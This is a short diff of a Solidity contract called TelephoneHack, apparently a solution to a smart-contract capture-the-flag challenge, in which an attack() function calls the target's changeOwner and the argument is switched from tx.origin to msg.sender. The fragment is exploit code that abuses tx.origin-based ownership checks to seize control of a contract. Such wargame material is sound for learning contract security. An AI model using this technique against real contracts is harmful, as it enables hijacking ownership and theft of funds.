@@ -64,8 +64,8 @@ contract TelephoneHack {
 
     function attack() external payable {
         // the condition to change the owner is that
-        //msg.sender != tx.origin
-        challenge.changeOwner(tx.origin);
+        //msg.sender != tx.origin because called from contract
+        challenge.changeOwner(msg.sender);
     }
 
     fallback() external payable {}
